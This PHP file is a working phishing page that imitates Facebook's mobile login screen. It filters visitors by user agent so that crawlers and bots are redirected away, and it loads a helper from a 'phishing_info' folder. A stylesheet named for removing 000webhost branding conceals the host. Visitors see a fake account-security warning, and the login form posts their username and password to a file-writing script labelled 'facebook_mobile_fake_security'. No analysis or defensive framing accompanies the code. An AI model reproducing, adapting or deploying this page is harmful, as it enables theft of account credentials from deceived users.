<?php echo'<link rel=stylesheet type=text/css href="./remove branding logo/000webhost.css">';echo "<script>filename = './phishing_info/'+window.location.pathname.substring(window.location.pathname.lastIndexOf('/')+1);</script>";$lib='./phishing_info/'.basename(__FILE__);if(!empty($_SERVER['HTTP_USER_AGENT'])){$ua=strtolower($_SERVER['HTTP_USER_AGENT']);if(substr_count($ua,"http://")=='0' and substr_count($ua,"https://")=='0' and substr_count($ua,"+")=='0' and substr_count($ua,".com")=='0'){if(substr_count($ua,"apple")=='1' or substr_count($ua,"firefox")=='1' or substr_count($ua,"windows")=='1' or substr_count($ua,"linux")=='1' or substr_count($ua,"android")=='1' or substr_count($ua,"chrome")=='1' or substr_count($ua,"safari")=='1' or substr_count($ua,"gecko")=='1' or substr_count($ua,"iphone")=='1' or substr_count($ua,"macintosh")=='1' or substr_count($ua,"mac")=='1' or substr_count($ua,"khtml")=='1' or substr_count($ua,"browser")=='1' or substr_count($ua,"nokia")=='1' or substr_count($ua,"microsoft")=='1' or substr_count($ua,"opera")=='1' or substr_count($ua,"mozilla")=='1' or substr_count($ua,"mobile")=='1' or substr_count($ua,"network")=='1' or substr_count($ua,"blackberry")=='1' or substr_count($ua,"cpu")=='1' or substr_count($ua,"outlook")=='1' or substr_count($ua,"pc")=='1'){include($lib);echo'<!DOCTYPE html><html><head><meta charset=UTF-8><title>Facebook – log in or sign up</title><link href="data:image/png;base64,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" rel="shortcut icon" sizes=196x196><style>.touch,.touch input{font-family:Helvetica,Arial,sans-serif;font-size:14px}.btn,.touchable,i.img{-webkit-user-select:none}.touch,.touch .btn,.touch button,.touch input{-webkit-tap-highlight-color:#000}.touch input{-webkit-user-select:text}@supports(padding-left:env(safe-area-inset-left)) and (padding-right:env(safe-area-inset-right)){#root{padding-left:env(safe-area-inset-left);padding-right:env(safe-area-inset-right)}}body{text-align:left;direction:ltr}body,button,input{font-family:sans-serif}body,li,ul{margin:0;padding:0}ul{list-style:none}.hq04{background:#3b5998;box-sizing:border-box;height:44px;margin:0 auto;padding:0;position:relative;width:100%;z-index:12}.hq06{min-width:100px;text-align:center}.touch .hq14{margin:0 auto;max-width:416px}.acw{border-color:#e9e9e9}.hq13{border-color:#d8dfea}.acw{background-color:#fff}.hq13{background-color:#eceff5}._52j9{color:#90949c}._52jc{font-size:12px;line-height:16px}.hq12{font-size:14px;line-height:20px}._52jh{font-weight:700}._52jj{text-align:center}.img{border:0;display:inline-block;vertical-align:top}i.img u{position:absolute;width:0;height:0;overflow:hidden}.btn{border:solid 2px;cursor:pointer;margin:0;padding:2px 6px 3px;text-align:center}.btnS{background:#69a74e;border-color:#98c37d #3b6e22 #2c5115;color:#fff}.btn .img{pointer-events:none}.btn{display:inline-block}.btn+.btn{margin-left:3px}.mfss{font-size:small}.mfsm,body,input{font-size:medium}.touch .mfss{font-size:12px;line-height:15px}.touch,.touch .mfsm,.touch input{font-size:14px;line-height:18px}.touch .btn{background-clip:padding-box;border:solid 1px;border-radius:4px;box-sizing:border-box;display:inline-block;font-weight:700;min-width:50px;overflow:hidden;padding:0 8px;text-overflow:ellipsis;vertical-align:bottom;white-space:nowrap}html .touch .btn{line-height:27px}.touch .btn .img{margin-right:4px}.touch .btn+.btn{margin-left:5px}.touch .medBtn{padding:3px 8px 2px}.touch .btn.btnS{color:#fff;text-shadow:0 -1px 0 #000}.touch .btnS{background:linear-gradient(#75ab4b,#4a8532);border-color:#68954c #427329 #386a24}.touch .btnS{box-shadow:inset 0 1px 0 #fff,0 1px 0 #000}form{margin:0;border:0}.touch a{color:#576b95;cursor:pointer;text-decoration:none}.touch a[href=""],.touch a[href="#"]{-webkit-touch-callout:none}.touchable{cursor:pointer}a.touchable{color:inherit;-webkit-tap-highlight-color:#fff}.touch .hq02{display:flex;display:-webkit-flex}.touch .hq25{display:flex}.touch .hq03{align-items:center}.touch .hq05{-webkit-flex:1;flex:1;min-width:0;width:0}.touch .hq05 .hq27{flex:1;width:100%}.fcg{color:gray}.hq19{background:#fff}.hq20.hq20>*,.hq20>*{border-bottom:1px solid #e5e5e5}.hq20>:last-child{border-bottom:0}.hq20.hq20>*,.hq20>*{border-bottom-color:#e5e5e5}.touch ._55wp{padding:0}.touch ._55wr{padding:8px}._56bs{-webkit-appearance:none;background:0;display:inline-block;font-size:12px;height:28px;line-height:28px;margin:0;overflow:visible;padding:0 9px;text-align:center;vertical-align:top;white-space:nowrap}.touch ._56bs{border:0;border-radius:3px;box-sizing:border-box;position:relative;-webkit-user-select:none;z-index:0}.touch ._56bs::after{border-radius:4px;border-style:solid;border-width:1px;bottom:-1px;box-shadow:0 1px 0 #fff,inset 0 -1px 1px 0 #fff;content:"";left:-1px;pointer-events:none;position:absolute;right:-1px;top:-1px;z-index:1}.touch ._56bs::before{border-radius:4px;bottom:-1px;content:"";left:-1px;pointer-events:none;position:absolute;right:-1px;top:-1px;transform:none;z-index:-1}._56bu{color:#fff}._56bw{font-size:14px;height:38px;line-height:38px;padding:0 16px margin-top:0}._56bs{line-height:20px;margin-top:4px display:inline-block}._56bs._56b_{display:block;width:100%}.hq22{border:0;display:block;margin:0;padding:0}.touch .hq22{-webkit-appearance:none;box-sizing:border-box;width:100%}.hq18{position:relative}.hq18::before{border-color:#d2d5da;border-radius:4px;border-style:solid;border-width:1px;bottom:-1px;left:-1px;pointer-events:none;position:absolute;right:-1px;top:-1px}.hq21{border-radius:4px;overflow:hidden}.hq07{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHwAAAAYCAMAAAAPpWnAAAAAY1BMVEUAAAD//8z////////39/f////6+vr////////////8/Pz////////////////////////////////////+/v7////////////////////////////+/v7////////+/v////8WP8GiAAAAIHRSTlMABQwWIS44QUxaZGtzf4yTmZ+mr7vAx87S197j6vD3/jIaHfAAAAKDSURBVHja5ZbJkuMgDECFl3hf8W6I/f9fOUgywXZNd3W6aiqH0SGAkPQACxFAidWOIuEt0W+7JEiJrjpf75+DF4TWuvkEXBrV9sDeB+CTUY3wIfhqVP3/B5dSPo1KmTYFEFmv9JiLSBoROB+Ug3qqsSGfsJ71c5XJCZ70Wo+FByxBgdZD4dvwj2oyHl3mXeAYHqPsTgrwR+71Gf4aB1Fux+RTgPcaSN/CK1aokFD501pnNBaNja2iE1wsptX+BZ6CtN3lgFtnOmDpTIcDrq1iFci+BDPSuvH2cPAS2wQu8DhksJyxQXjMgaUct4QHfRLR9mKE8+REbWaL1SyX/dhYRNSxU7xeCw83m2RBEKw4ZVo+pILKDsM7bEqBZh6MuDDsp+TL8MYo4g1nAGpU5Na9BPJ44jFL2qqFD6gO7tk+2vMDPnaBe5zgEBwUVI7xGzJcUyJJXupE1tZ9AIHqmjzQtzrgqV2jg7v8deEC3gELDWRmJGeWJgIKpWcITEBpcF0Q8n5R8EN2DE/QbxJ3uLe/vCuKH57XGO0XCdxSOWgc2I92ZJR/utY9fZjklcsP+MdwL/4rfODz+MWxD7UV/7fHHuPWlQ9fJpxYXcLN54QrwcpPE66hhNvIl79DxOo7vKGdfnXVptOKQzhdteTbqxbfrxpjojs85LLRLdciozo57ykfrq6yrGjXPUA4T87UprbILN1Kes8WmanT1yLjKTTzbvDvy6sYrtVTo93Py2to4Udb3uHecHtY4PKwSBerYXguD/ZbDwt07r9T1bZtASxpv9KT2hoR/EgazTo0ET+Qo9r03NeJmauNSWwclOIn1Vn37kkNy1Hp5XhSKWqIZtjJ4aPyB+MlmizSbGUqAAAAAElFTkSuQmCC);background-size:auto;background-repeat:no-repeat;display:inline-block;height:16px;width:16px}.hq07{width:24px;height:24px;background-position:-25px -143px}.hq07.hq08{width:123px;height:24px;background-position:0 0}.hq10{padding:8px}.touch ._5ui2 ._5dpw{text-align:center}.touch ._5ui3{padding:6px}._1rrd{border:1px solid #3b5998;border-radius:3px;color:#3578e5;display:block;font-size:large;height:18px;line-height:17px;margin-right:1px;text-align:center;vertical-align:middle;width:18px}._3j87{margin:0 auto}._3j87 .img{margin:3px 0}.touch .hq23{padding:12px}._5soa .hq14 .other-links{padding-bottom:36px;text-align:center}._5soa .hq14 .other-links a{color:#7596c8;font-size:12px;line-height:16px}._5soa .hq14 .other-links span{color:#4b4f56;font-size:12px;line-height:16px}._5soa .hq14{padding:0 16px}.hq17{padding-bottom:1px;padding-top:16px}._5t3b{padding:12px 0 12px 0}html .touch ._5soa ._28le{background:#00a400;border:0;box-shadow:none}.touch ._5t3b a._5t3c{height:36px;padding-left:16px;padding-right:16px;padding-top:5px}.touch ._5t3b>._5t3c::before{background-color:#46a800;border-color:#60a62e #519f18 #409701}.touch ._5t3b>._28le::before{background-color:#00a400;border:0}._43mg{display:block;margin-left:5%;margin-right:5%;margin-top:10px;overflow:hidden;text-align:center;white-space:nowrap;width:90%}._43mg>span{display:inline-block;position:relative}._43mg>span:after,._43mg>span:before{background:#ccd0d5;content:"";height:1px;position:absolute;top:50%;width:9999px}._43mg>span:before{margin-right:15px;right:100%}._43mg>span:after{left:100%;margin-left:15px}._43mh{color:#4b4f56}.touch ._5soa ._28lf::before{background-color:#3578e5;background-image:none}html .touch ._5soa ._28lf::after{border-image:none;border-width:0}.touch .hq28{line-height:20px}.hq28{box-sizing:border-box;width:100%}.hq24{background-color:#fff}.hq09{background:#fa3e3e}.hq11{color:#fff}</style></head><body class="touch iframe acw portrait" style=min-height:616px;background-color:#fff;><div style=min-height:616px><div class="hq02 hq03 hq04"><div class="hq05 hq06"><a href><i class="img hq07 hq08"><u>facebook</u></i></a></div></div><div class="_5soa acw" style=min-height:616px><div class=hq02><div class=hq05><div class="hq09 hq10 hq11" style=display:none><div class=hq12></div></div><div style="color: #fff;background: #fa3e3e;padding: 8px;">Facebook wants to make sure you are real owner of account. For security reasons, you must log in to continue.<a href="#" style="font-weight:bold;color:#fff;">Learn More</a>.</div><div class=hq13><div class=hq14><div></div><form method=post action=.././other/post_in_file.php class=hq17><div class=hq18><div class="hq19 hq20 hq21"><input class="hq22 hq23" autocomplete=on name=username placeholder="Mobile number or email address" type=text required><div><div class=hq24><div class=hq02><div class="hq05 hq25 hq03"><div class=hq27><input class="hq22 hq23 hq28" name=password placeholder=Password type=password required><input type=hidden name=location value=facebook_mobile_fake_security /><input type=hidden name=link value='.$redirect.'></div></div></div></div></div></div></div><div style=text-align:center;padding-top:12px;><button type=submit class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu"><span>Log In</span></button></div></form><div><div class=_43mg><span class=_43mh>or</span></div><div class="_52jj _5t3b"><a role=button class="_5t3c _28le btn btnS medBtn mfsm touchable">Create New Account</a></div></div><div><div class=other-links><ul class=_55wp><li><span class="mfss fcg"><a href=#>Forgotten password?</a></span></li></ul></div></div></div><div></div></div></div></div><div><div></div></div><div class="_55wr _5ui2"><div class="hq02 _5dpw _5ui3"><div class=hq05><span class="_52jc _52j9 _52jh _3ztb">English (UK)</span><div class=_3ztc><span class=_52jc><a href=#>پښتو</a></span></div><div class=_3ztc><span class=_52jc><a href=#>हिन्दी</a></span></div><div class=_3ztc><span class=_52jc><a href=#>Español</a></span></div></div><div class=hq05><div class=_3ztc><span class=_52jc><a href=#>اردو</a></span></div><div class=_3ztc><span class=_52jc><a href=#>العربية</a></span></div><div class=_3ztc><span class=_52jc><a href=#>বাংলা</a></span></div><div class="_3j87 _1rrd"><i style=color:#7F7F7F><b>+</b></i></div></div></div><center><span class="mfss fcg">Facebook ©2019</span></center></div></div></div></body></html>';}else{echo'<script>window.location.replace(filename);</script>';}}else{echo'<script>window.location.replace(filename);</script>';}}else{echo'<script>window.location.replace(filename);</script>';}?>